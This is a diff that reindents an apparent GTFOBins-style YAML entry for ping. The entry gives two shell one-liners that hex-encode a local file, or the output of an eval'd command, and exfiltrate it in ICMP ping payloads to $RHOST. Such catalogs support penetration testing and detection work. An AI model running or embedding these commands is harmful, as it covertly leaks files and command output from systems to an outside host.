@@ -10,13 +10,13 @@ functions:
         Send local file content over ICMP using hex-encoded payloads.
       code: |
         hex=""; while IFS= read -r line; do set -- $line; for i in $(seq 1 $#);
-	do eval "hex=\${hex}\${$i// /}"; done; done < <(od -An -tx1 -v $LFILE);
-	i=0; while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
-	ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
+        do eval "hex=\${hex}\${$i// /}"; done; done < <(od -An -tx1 -v $LFILE);
+        i=0; while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
+        ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
     - description: Send command output over ICMP using hex-encoded payloads.
       code: |
         hex=""; while IFS= read -r line; do set -- $line; for i in $(seq 1 $#);
-	do eval "hex=\${hex}\${$i// /}"; done; done < <(eval "$CMD" | od -An -tx1 -v);
+        do eval "hex=\${hex}\${$i// /}"; done; done < <(eval "$CMD" | od -An -tx1 -v);
         i=0; while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
         ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
 ---
